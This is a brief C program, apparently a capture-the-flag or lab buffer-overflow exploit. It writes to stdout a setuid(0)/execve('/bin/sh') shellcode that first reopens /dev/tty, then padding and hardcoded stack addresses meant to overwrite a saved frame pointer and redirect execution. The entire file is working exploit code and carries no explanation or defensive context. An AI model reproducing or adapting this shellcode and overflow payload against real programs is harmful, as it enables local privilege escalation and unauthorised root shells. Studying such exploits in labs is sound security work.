#include <stdio.h>

char sc[] =
    "\x31\xc0\x31\xdb\xb0\x06\xcd\x80" // length=8 close(0)
    "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80" // length=23, open("/dev/tty", O_RDWR)
    "\x6a\x17\x58\x31\xdb\xcd\x80" // length=7, call setuid(0)
    "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"; // length=24, execve("/bin/sh", ["/bin/sh"], NULL)
char padding[] = "\x00\x00" "000100020003000400050006000700080009001000110012001300140015001600170018";

int main(void)
{
    unsigned int ebp_address = 0xffffd558;
    unsigned int password_address = 0xffffd4b0;

    printf("%s", sc);
    fwrite(padding, 1, sizeof(padding) - 1, stdout);
    printf("%s%s", (char*)&ebp_address, (char*)&password_address);

    return 0;
}
